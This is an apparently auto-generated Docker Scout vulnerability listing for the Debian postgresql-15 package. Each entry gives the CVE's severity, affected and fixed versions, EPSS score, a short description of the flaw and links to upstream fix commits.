<a href="https://scout.docker.com/v/CVE-2025-8715?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.14-0%2Bdeb12u1"><img alt="high : CVE--2025--8715" src="https://img.shields.io/badge/CVE--2025--8715-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.14-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.14-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Improper neutralization of newlines in pg_dump in PostgreSQL allows a user of the origin server to inject arbitrary code for restore-time execution as the client operating system account running psql to restore the dump, via psql meta-commands inside a purpose-crafted object name.  The same attacks can achieve SQL injection as a superuser of the restore target server.  pg_dumpall, pg_restore, and pg_upgrade are also affected.  Versions before PostgreSQL 17.6, 16.10, 15.14, 14.19, and 13.22 are affected.  Versions before 11.20 are unaffected.  CVE-2012-0868 had fixed this class of problem, but version 11.20 reintroduced it.

---
- postgresql-17 17.6-1
[trixie] - postgresql-17 17.6-0+deb13u1
- postgresql-15 <removed>
[bookworm] - postgresql-15 15.14-0+deb12u1
- postgresql-13 <removed>
https://www.postgresql.org/about/news/postgresql-176-1610-1514-1419-1322-and-18-beta-3-released-3118/
https://www.postgresql.org/support/security/CVE-2025-8715/
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=70693c645f6e490b9ed450e8611e94ab7af3aad2 (master)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8714?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.14-0%2Bdeb12u1"><img alt="high : CVE--2025--8714" src="https://img.shields.io/badge/CVE--2025--8714-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.14-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.14-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Untrusted data inclusion in pg_dump in PostgreSQL allows a malicious superuser of the origin server to inject arbitrary code for restore-time execution as the client operating system account running psql to restore the dump, via psql meta-commands.  pg_dumpall is also affected.  pg_restore is affected when used to generate a plain-format dump.  This is similar to MySQL CVE-2024-21096.  Versions before PostgreSQL 17.6, 16.10, 15.14, 14.19, and 13.22 are affected.

---
- postgresql-17 17.6-1
[trixie] - postgresql-17 17.6-0+deb13u1
- postgresql-15 <removed>
[bookworm] - postgresql-15 15.14-0+deb12u1
- postgresql-13 <removed>
https://www.postgresql.org/about/news/postgresql-176-1610-1514-1419-1322-and-18-beta-3-released-3118/
https://www.postgresql.org/support/security/CVE-2025-8714/
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=71ea0d6795438f95f4ee6e35867058c44b270d51 (master)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-7348?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.8-0%2Bdeb12u1"><img alt="high : CVE--2024--7348" src="https://img.shields.io/badge/CVE--2024--7348-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.8-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.8-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.764%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>73rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Time-of-check Time-of-use (TOCTOU) race condition in pg_dump in PostgreSQL allows an object creator to execute arbitrary SQL functions as the user running pg_dump, which is often a superuser. The attack involves replacing another relation type with a view or foreign table. The attack requires waiting for pg_dump to start, but winning the race condition is trivial if the attacker retains an open transaction. Versions before PostgreSQL 16.4, 15.8, 14.13, 13.16, and 12.20 are affected.

---
- postgresql-16 16.4-1
- postgresql-15 <removed>
- postgresql-13 <removed>
https://www.postgresql.org/about/news/postgresql-164-158-1413-1316-1220-and-17-beta-3-released-2910/
https://www.postgresql.org/support/security/CVE-2024-7348/
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=79c7a7e29695a32fef2e65682be224b8d61ec972 (REL_12_20)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-10979?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.9-0%2Bdeb12u1"><img alt="high : CVE--2024--10979" src="https://img.shields.io/badge/CVE--2024--10979-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.9-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.9-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>6.857%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Incorrect control of environment variables in PostgreSQL PL/Perl allows an unprivileged database user to change sensitive process environment variables (e.g. PATH).  That often suffices to enable arbitrary code execution, even if the attacker lacks a database server operating system user.  Versions before PostgreSQL 17.1, 16.5, 15.9, 14.14, 13.17, and 12.21 are affected.

---
- postgresql-17 17.1-1
- postgresql-16 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1088687)
- postgresql-15 <removed>
- postgresql-13 <removed>
https://www.postgresql.org/support/security/CVE-2024-10979/
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=3ebcfa54db3309651d8f1d3be6451a8449f6c6ec (v17.2, 1 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=4cd4f3b97492c1b38115d0563a2e55b136eb542a (v17.2, 2 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=8d19f3fea003b1f744516b84cbdb0097ae7b2912 (v17.2, 3 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=8fe3e697a1a83a722b107c7cb9c31084e1f4d077 (v16.6, 1 of 4)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=88269df4da032bb1536d4291a13f3af4e1e599ba (v16.6, 2 of 4)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=168579e23bdbeda1a140440c0272b335d53ad061 (v16.6, 3 of 4)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=64df8870097aa286363a5d81462802783abbfa61 (v16.6, 4 of 4)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=e530835c6cc5b2dbf330ebe6b0a7fb9f19f5a54c (v15.10, 1 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=c834b375a6dc36ff92f9f738ef1d7af09d91165f (v15.10, 2 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=d15ec27c977100037ae513ab7fe1a214bfc2507b (v14.15, 1 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=f89bd92c963c3be30a1cf26960aa86aaad117235 (v14.15, 2 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=256e34653aadd3582b98411d7d26f4fbb865e0ec (v14.15, 3 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=e428cd058f0bebb5782b0c263565b0ad088e9650 (v13.18, 1 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=6bccd7b037d09b91ce272c68f43705e2fecd4cca (v13.18, 2 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=0bd9560d964abc09e446e4c5e264bb7a0886e5ea (v13.18, 3 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=2ab12d860e51e468703a2777b3759b7a61639df2 (v12.21, 1 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=b1e58defb6a43fe35511eaa80858293b07c8b512 (v12.21, 2 of 3)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=9fc1c3a02ddc4cf2a34550c0f985288cea7094bd (v12.21, 3 of 3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1094?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.11-0%2Bdeb12u1"><img alt="high : CVE--2025--1094" src="https://img.shields.io/badge/CVE--2025--1094-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.11-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.11-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>80.274%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Improper neutralization of quoting syntax in PostgreSQL libpq functions PQescapeLiteral(), PQescapeIdentifier(), PQescapeString(), and PQescapeStringConn() allows a database input provider to achieve SQL injection in certain usage patterns.  Specifically, SQL injection requires the application to use the function result to construct input to psql, the PostgreSQL interactive terminal.  Similarly, improper neutralization of quoting syntax in PostgreSQL command line utility programs allows a source of command line arguments to achieve SQL injection when client_encoding is BIG5 and server_encoding is one of EUC_TW or MULE_INTERNAL.  Versions before PostgreSQL 17.3, 16.7, 15.11, 14.16, and 13.19 are affected.

---
- postgresql-17 17.3-1
- postgresql-15 <removed>
[bookworm] - postgresql-15 15.11-0+deb12u1
- postgresql-13 <removed>
https://www.postgresql.org/support/security/CVE-2025-1094/
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=7d43ca6fe068015b403ffa1762f4df4efdf68b69 (REL_17_3)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=61ad93cdd48ecc8c6edf943f4d888a9325b66882 (REL_17_3)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=43a77239d412db194a69b18b7850580e3b78218f (REL_17_3)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=02d4d87ac20e2698b5375b347c451c55045e388d (REL_17_3)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=dd3c1eb38e9add293f8be59b6aec7574e8584bdb (REL_17_3)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=05abb0f8303a78921f7113bee1d72586142df99e (REL_17_3)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=85c1fcc6563843d7ee7ae6f81f29ef813e77a4b6 (REL_17_3)
Regression: https://www.openwall.com/lists/oss-security/2025/02/16/3
https://www.postgresql.org/about/news/postgresql-174-168-1512-1417-and-1320-released-3018/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-0985?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.6-0%2Bdeb12u1"><img alt="high : CVE--2024--0985" src="https://img.shields.io/badge/CVE--2024--0985-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.6-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.6-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.623%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Late privilege drop in REFRESH MATERIALIZED VIEW CONCURRENTLY in PostgreSQL allows an object creator to execute arbitrary SQL functions as the command issuer. The command intends to run SQL functions as the owner of the materialized view, enabling safe refresh of untrusted materialized views. The victim is a superuser or member of one of the attacker's roles. The attack requires luring the victim into running REFRESH MATERIALIZED VIEW CONCURRENTLY on the attacker's materialized view. Versions before PostgreSQL 16.2, 15.6, 14.11, 13.14, and 12.18 are affected.

---
- postgresql-16 16.2-1
- postgresql-15 <removed>
- postgresql-13 <removed>
- postgresql-11 <removed>
https://github.com/google/security-research/security/advisories/GHSA-9984-7hcf-v553
https://www.postgresql.org/support/security/CVE-2024-0985/
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=d6a61cb3bef3c8fbc35c2a6182e75a8c1d351e41 (REL_16_2)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=f2fdea198b3d0ab30b9e8478a762488ecebabd88 (REL_15_6)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=d541ce3b6f0582723150f45d52eab119985d3c19 (REL_13_14)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=2699fc035a75d0774c1f013e9320882287f78adb (REL_12_18)
Commits have wrong CVE mentioned but the correct one is CVE-2024-0985

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-4207?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.13-0%2Bdeb12u1"><img alt="medium : CVE--2025--4207" src="https://img.shields.io/badge/CVE--2025--4207-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.13-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.13-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.073%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Buffer over-read in PostgreSQL GB18030 encoding validation allows a database input provider to achieve temporary denial of service on platforms where a 1-byte over-read can elicit process termination.  This affects the database server and also libpq.  Versions before PostgreSQL 17.5, 16.9, 15.13, 14.18, and 13.21 are affected.

---
- postgresql-17 17.5-1
- postgresql-15 <removed>
[bookworm] - postgresql-15 15.13-0+deb12u1
- postgresql-13 <removed>
https://www.postgresql.org/about/news/postgresql-175-169-1513-1418-and-1321-released-3072/
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=ec5f89e8a29f32c7dbc4dd8734ed8406d771de2f (REL_17_5)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=44ba3f55f552b56b2fbefae028fcf3ea5b53461d (REL_15_13)
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=cbadeaca9271a1bade8ef9790bae09dc92e0ed30 (REL_13_21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-12818?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.15-0%2Bdeb12u1"><img alt="medium : CVE--2025--12818" src="https://img.shields.io/badge/CVE--2025--12818-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.15-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.15-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.074%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Integer wraparound in multiple PostgreSQL libpq client library functions allows an application input provider or network peer to cause libpq to undersize an allocation and write out-of-bounds by hundreds of megabytes.  This results in a segmentation fault for the application using libpq.  Versions before PostgreSQL 18.1, 17.7, 16.11, 15.15, 14.20, and 13.23 are affected.

---
- postgresql-18 18.1-1
- postgresql-17 <removed>
[trixie] - postgresql-17 17.7-0+deb13u1
- postgresql-15 <removed>
[bookworm] - postgresql-15 15.15-0+deb12u1
- postgresql-13 <removed>
https://www.postgresql.org/about/news/postgresql-181-177-1611-1515-1420-and-1323-released-3171/
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=600086f471a3bb57ff4953accf1d3f8d2efe0201 (master)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=7eb8fcad860e9a0548191dab7a87a5bead5f8e91 (REL_18_1)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=f5999f01815969dfe8df33bac9c0f1aa38dd6cd5 (REL_17_7)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=91421565febbf99c1ea2341070878dc50ab0afef (REL_15_15)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=d6f0c0d6d6d3f14177848e4a00df988fa2f0a09a (REL_13_23)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-10978?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.9-0%2Bdeb12u1"><img alt="medium : CVE--2024--10978" src="https://img.shields.io/badge/CVE--2024--10978-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.9-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.9-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.613%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Incorrect privilege assignment in PostgreSQL allows a less-privileged application user to view or change different rows from those intended.  An attack requires the application to use SET ROLE, SET SESSION AUTHORIZATION, or an equivalent feature.  The problem arises when an application query uses parameters from the attacker or conveys query results to the attacker.  If that query reacts to current_setting('role') or the current user ID, it may modify or return data as though the session had not used SET ROLE or SET SESSION AUTHORIZATION.  The attacker does not control which incorrect user ID applies.  Query text from less-privileged sources is not a concern here, because SET ROLE and SET SESSION AUTHORIZATION are not sandboxes for unvetted queries.  Versions before PostgreSQL 17.1, 16.5, 15.9, 14.14, 13.17, and 12.21 are affected.

---
- postgresql-17 17.1-1
- postgresql-16 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1088687)
- postgresql-15 <removed>
- postgresql-13 <removed>
https://www.postgresql.org/support/security/CVE-2024-10978/
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=cd82afdda5e9d3269706a142e9093ba83f484185 (v17.2, 1 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=f4f5d27d87247da1ec7e5a6e7990a22ffba9f63a (v17.2, 2 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=1c05004a895308da10ec000ba6b92f72f4f5b8e2 (v17.2, regression fix)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=ae340d0318521ae7234ed3b7221a1f65f39a52c0 (v16.6, 1 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=95f5a523729f6814c8757860d9a2264148b7b0df (v16.6, 2 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=b0918c1286d316f6ffa93995452270afd4fc4335 (v16.6, regression fix)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=a5d2e6205f716c79ecfb15eb1aae75bae3f8daa9 (v15.10, 1 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=109a323807d752f66699a9ce0762244f536e784f (v15.10, 2 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=edf80895f6bda824403f843df91cbc83890e4b6c (v15.10, regression fix)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=2a68808e241bf667ff72c31ea9d0c4eb0b893982 (v14.15, 1 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=00b94e8e2f99a8ed1d7f854838234ce37f582da0 (v14.15, 2 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=be062bfa54d780c07a3b36c4123da2c960c8e97d (v14.15, regression fix)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=76123ded6e9b3624e380ac326645bd026aacd2f5 (v13.18, 1 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=dc7378793add3c3d9a40ec2118d92bd719acab97 (v13.18, 2 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=07c6e0f613612ff060572a085c1c24aa44c8b2bb (v13.18, regression fix)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=4c9d96f74ba4e7d01c086ca54f217e242dd65fae (v12.21, 1 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=0edad8654848affe0786c798aea9e1a43dde54bc (v12.21, 2 of 2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=c463338656ac47e5210fcf9fbf7d20efccce8de8 (v12.21, regression fix)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-10976?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.9-0%2Bdeb12u1"><img alt="medium : CVE--2024--10976" src="https://img.shields.io/badge/CVE--2024--10976-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.9-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.9-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.099%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>78th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Incomplete tracking in PostgreSQL of tables with row security allows a reused query to view or change different rows from those intended.  CVE-2023-2455 and CVE-2016-2193 fixed most interaction between row security and user ID changes.  They missed cases where a subquery, WITH query, security invoker view, or SQL-language function references a table with a row-level security policy.  This has the same consequences as the two earlier CVEs.  That is to say, it leads to potentially incorrect policies being applied in cases where role-specific policies are used and a given query is planned under one role and then executed under other roles.  This scenario can happen under security definer functions or when a common user and query is planned initially and then re-used across multiple SET ROLEs.  Applying an incorrect policy may permit a user to complete otherwise-forbidden reads and modifications.  This affects only databases that have used CREATE POLICY to define a row security policy.  An attacker must tailor an attack to a particular application's pattern of query plan reuse, user ID changes, and role-specific row security policies.  Versions before PostgreSQL 17.1, 16.5, 15.9, 14.14, 13.17, and 12.21 are affected.

---
- postgresql-17 17.1-1
- postgresql-16 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1088687)
- postgresql-15 <removed>
- postgresql-13 <removed>
https://www.postgresql.org/support/security/CVE-2024-10976/
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=edcda9bb4c4500b75bb4a16c7c59834398ca2906 (v17.2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=562289460e118fcad44ec916dcdab21e4763c38c (v16.6)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=6db5ea8de8ce15897b706009aaf701d23bd65b23 (v15.10)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=4e51030af9e0a12d7fa06b73acd0c85024f81062 (v14.15)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=952ff31e2a89e8ca79ecb12d61fddbeac3d89176 (v13.18)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=448525e8a44080b6048e24f6942284b7eeae1a5c (v12.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8713?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.14-0%2Bdeb12u1"><img alt="low : CVE--2025--8713" src="https://img.shields.io/badge/CVE--2025--8713-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.14-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.14-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

PostgreSQL optimizer statistics allow a user to read sampled data within a view that the user cannot access.  Separately, statistics allow a user to read sampled data that a row security policy intended to hide.  PostgreSQL maintains statistics for tables by sampling data available in columns; this data is consulted during the query planning process.  Prior to this release, a user could craft a leaky operator that bypassed view access control lists (ACLs) and bypassed row security policies in partitioning or table inheritance hierarchies.  Reachable statistics data notably included histograms and most-common-values lists.  CVE-2017-7484 and CVE-2019-10130 intended to close this class of vulnerability, but this gap remained.  Versions before PostgreSQL 17.6, 16.10, 15.14, 14.19, and 13.22 are affected.

---
- postgresql-17 17.6-1
[trixie] - postgresql-17 17.6-0+deb13u1
- postgresql-15 <removed>
[bookworm] - postgresql-15 15.14-0+deb12u1
- postgresql-13 <removed>
https://www.postgresql.org/about/news/postgresql-176-1610-1514-1419-1322-and-18-beta-3-released-3118/
https://www.postgresql.org/support/security/CVE-2025-8713/
https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=22424953cded3f83f0382383773eaf36eb1abda9 (master)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-12817?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.15-0%2Bdeb12u1"><img alt="low : CVE--2025--12817" src="https://img.shields.io/badge/CVE--2025--12817-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.15-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.15-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.066%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Missing authorization in PostgreSQL CREATE STATISTICS command allows a table owner to achieve denial of service against other CREATE STATISTICS users by creating in any schema.  A later CREATE STATISTICS for the same name, from a user having the CREATE privilege, would then fail.  Versions before PostgreSQL 18.1, 17.7, 16.11, 15.15, 14.20, and 13.23 are affected.

---
- postgresql-18 18.1-1
- postgresql-17 <removed>
[trixie] - postgresql-17 17.7-0+deb13u1
- postgresql-15 <removed>
[bookworm] - postgresql-15 15.15-0+deb12u1
- postgresql-13 <removed>
https://www.postgresql.org/about/news/postgresql-181-177-1611-1515-1420-and-1323-released-3171/
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=5e4fcbe531c668b4112beedde97aac79724074c5 (master)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=00eb646ea43410e5df77fed96f4a981e66811796 (REL_18_1)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=e2fb3dfa817fbe89494a62c100e9cb442f4d6b15 (REL_17_7)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=2393d374ae9c0bc8327adc80fe4490edb05be167 (REL_15_15)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=8a2530ebcdef1aafa08ad1d019aec298dcebb952 (REL_13_23)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-10977?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.9-0%2Bdeb12u1"><img alt="low : CVE--2024--10977" src="https://img.shields.io/badge/CVE--2024--10977-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.9-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.9-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.375%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Client use of server error message in PostgreSQL allows a server not trusted under current SSL or GSS settings to furnish arbitrary non-NUL bytes to the libpq application.  For example, a man-in-the-middle attacker could send a long error message that a human or screen-scraper user of psql mistakes for valid query results.  This is probably not a concern for clients where the user interface unambiguously indicates the boundary between one error message and other text.  Versions before PostgreSQL 17.1, 16.5, 15.9, 14.14, 13.17, and 12.21 are affected.

---
- postgresql-17 17.1-1
- postgresql-16 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1088687)
- postgresql-15 <removed>
- postgresql-13 <removed>
https://www.postgresql.org/support/security/CVE-2024-10977/
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=a5cc4c66719be2ae1eebe92ad97727dc905bbc6d (v17.2)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=67d28bd02ec06f5056754bc295f57d2dd2bbd749 (v16.6)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=d2c3e31c13a6820980c2c6019f0b8f9f0b63ae6e (v15.10)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=e6c9454764d880ee30735aa8c1e05d3674722ff9 (v14.15)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=7b49707b72612ef068ce9275b9b6da104f1960f3 (v13.18)
Fixed by: https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=2a951ef0aace58026c31b9a88aeeda19c9af4205 (v12.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-4317?s=debian&n=postgresql-15&ns=debian&t=deb&osn=debian&osv=12&vr=%3C15.7-0%2Bdeb12u1"><img alt="low : CVE--2024--4317" src="https://img.shields.io/badge/CVE--2024--4317-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><15.7-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>15.7-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.211%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

